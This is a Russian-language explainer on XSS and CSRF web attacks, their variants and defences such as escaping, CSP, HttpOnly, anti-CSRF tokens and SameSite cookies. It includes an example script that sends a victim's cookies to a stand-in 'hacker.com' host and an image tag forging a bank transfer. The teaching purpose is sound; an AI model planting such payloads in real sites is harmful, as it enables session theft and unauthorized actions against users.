
Две самые известные атаки на веб-приложения: XSS (Межсайтовый скриптинг) и CSRF (Подделка межсайтовых запросов).

---

## XSS (Cross-Site Scripting)

Атака, при которой злоумышленник внедряет вредоносный JavaScript код на веб-страницу, просматриваемую другими пользователями.

### Как работает:
Злоумышленник находит уязвимость (например, форма комментариев, которая не экранирует HTML теги) и отправляет текст: `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`. 
Когда другие пользователи открывают эту страницу, браузер выполняет этот скрипт от их имени, что позволяет украсть куки, токены сессий или выполнить действия от лица пользователя.

### Виды XSS:
1. **Stored (Хранимый):** Вредоносный код сохраняется в базе данных приложения (например, в комментарии или профиле) и отдается сервером навсегда.
2. **Reflected (Отраженный):** Вредоносный код передается через URL (например, параметр поиска `?q=<script>...`) и сразу отображается сервером на странице.
3. **DOM-based:** Уязвимость находится полностью на клиенте (например, JS читает `window.location.hash` и вставляет его в HTML через `innerHTML`).

### Как защититься:
- **Экранирование (Escaping):** Преобразовывать опасные символы (`<`, `>`, `&`, `"`) в безопасные HTML-сущности при выводе данных. Современные фреймворки (Vue, React) делают это по умолчанию.
- **Использование Content Security Policy (CSP):** Запрещает инлайн-скрипты и ограничивает домены, откуда можно грузить код.
- **Флаг HttpOnly для Cookies:** Не позволяет читать сессионные куки через `document.cookie` в JS.

## CSRF (Cross-Site Request Forgery)

Атака, заставляющая авторизованного пользователя выполнить нежелательные действия на веб-приложении, в котором он в данный момент аутентифицирован.

### Как работает:
Пользователь авторизован на сайте банка (`bank.com`), и его сессионная кука сохранена в браузере. Злоумышленник заманивает пользователя на свой сайт (`evil.com`), где находится скрытая форма (или просто картинка `<img src="http://bank.com/transfer?amount=1000&to=hacker" />`). При загрузке страницы браузер автоматически делает запрос на `bank.com`, **прикрепляя куки пользователя**. Банк думает, что это легитимный запрос.

### Как защититься:
- **Anti-CSRF Tokens:** Сервер генерирует уникальный токен для каждой сессии (или формы) и требует его передачи (обычно в заголовке или скрытом поле формы) при любом изменении состояния (POST, PUT, DELETE). Сайт злоумышленника не может прочитать этот токен (из-за политики SOP/CORS).
- **Атрибут `SameSite` для Cookies:** Установка `SameSite=Lax` или `SameSite=Strict` для сессионных куки предотвращает их отправку при запросах со сторонних доменов.
- **Проверка заголовка `Origin` или `Referer`** на сервере.
